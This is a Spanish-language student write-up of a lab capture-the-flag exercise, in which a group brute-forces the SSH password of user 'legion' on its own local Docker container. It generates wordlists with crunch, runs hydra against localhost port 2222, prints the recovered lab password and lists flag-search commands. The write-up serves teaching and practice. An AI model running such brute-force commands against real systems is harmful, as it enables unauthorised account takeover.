# Creando CTF's

# Reto CTF: Ubuntu con SSH y Usuario 'Legion'

## Objetivo
Acceder vía SSH a un contenedor Docker con usuario `legion`, cuya contraseña debe ser descubierta a través de fuerza bruta basada en un acertijo. Se utilizaron herramientas como `crunch` e `hydra` para automatizar el proceso.

---

##  Paso 1. Preparación del entorno

### Se Descargo la imagen del contenedor
```bash
docker pull jaiderospina/retoctf:1.0
```

Luego se ejecuto el contenedor en segundo plano

```bash
docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
```

Se solucionó el conflicto de nombre

```bash
docker rm -f mi-contenedor-ssh
```

##  Paso 2. Verificación del contenedor

```bash
docker ps
```

Confirmó contenedor activo y SSH escuchando en puerto 2222.

##  Paso 3. Análisis del acertijo

Cinco letras ocultas en las palabras estrella, selva, dedo, gato;
Pista: podria existir relacion con las iniciales.
Analisis: siguiendo las instrucciones del acertijo y analizando el contexto se llego a una hipotesis.
Hipótesis principal: la combinacion tiene que ver con la sigla ESDEG,esdeg, o con alguna variante si depronto habia una trampa, como esdeo, o esdog, etc.

##  Paso 4. Generación de diccionarios con Crunch

Se genero este diccionario

```bash
crunch 5 5 -t ES%%O -o esdeo.lst
```

En este punto se generaron varias listas, ya que en el primer intento la ista no alcanzo a abarcar la combinacion correcta.

#  Lista reducida: 

```bash
crunch 5 5 estdgo -o reducido.lst
Lista ampliada:
```

# Lista ampliada:

```bash
crunch 5 5 estdogal -o ampliada.lst
```

# Lista completa (opcional):
```bash
crunch 5 5 abcdefghijklmnopqrstuvwxyz -o full.lst
```

##  Paso 5. Ataques con Hydra

Comando base usado:
```bash
hydra -t 4 -l legion -P [archivo] -s 2222 localhost ssh
```

# Diccionarios probados:

esdeo.lst ❌

reducido.lst ❌

ampliada.lst ❌


##  Paso 6. Verificación manual de servicio SSH

Al no tener resultado fructifero, se procede a una verificacion manual, tratando de adivinar la clave. 

```bash
ssh legion@localhost -p 2222
```

Confirmado: SSH activo y pidiendo contraseña.

se probaron las 2 claves mas probables. ESDEG y esdeg. pero el acceso fue denegado.


##  Paso 7. Ataque exitoso con combinaciones personalizadas

Se elabora un wordlist, en donde se le pide a crunch que pruebe combinaciones posibles con estas dos palabras y que intente revolviendo mayusculas y minusculas.

# Crear wordlist:

```bash
echo -e "esdeg\nESDEG\nEsdeg\neSdeg\nesDEG\neSdEg\nEsDEg\nESDeg\nesDEg\nEsdEg" > combinadas.lst
```

luego ejecutamos hydra

# Ejecutar Hydra:

```bash
hydra -l legion -P combinadas.lst -s 2222 localhost ssh
```

# Resultado: BANG!!!

¡[BANG]()

css

[22][ssh] host: localhost login: legion password: Esdeg
##  Paso 8. Acceso SSH exitoso


ssh legion@localhost -p 2222
# Contraseña: Esdeg


##  Paso 9. Búsqueda de bandera
Comandos usados:


ls -la
cat flag.txt
find / -name "*flag*" 2>/dev/null
cat /etc/motd
grep -r "CTF{" /home 2>/dev/null
❌ No se encontró bandera explícita en el contenedor.

🧠 Lecciones aprendidas
Uso táctico de crunch para generar diccionarios.

Dominio de hydra con control de tareas (-t).

Verificación previa de puertos y servicio SSH.

Importancia de considerar variantes en uso de mayúsculas.

Documentación detallada del proceso paso a paso.

Contraseña final encontrada: Esdeg
Usuario: legion
Puerto: 2222

📁 Autor: [grupo 4 - ]
📅 Fecha: Julio 2025
🎓 Proyecto académico – Electiva Habilidades Prácticas CTF



---
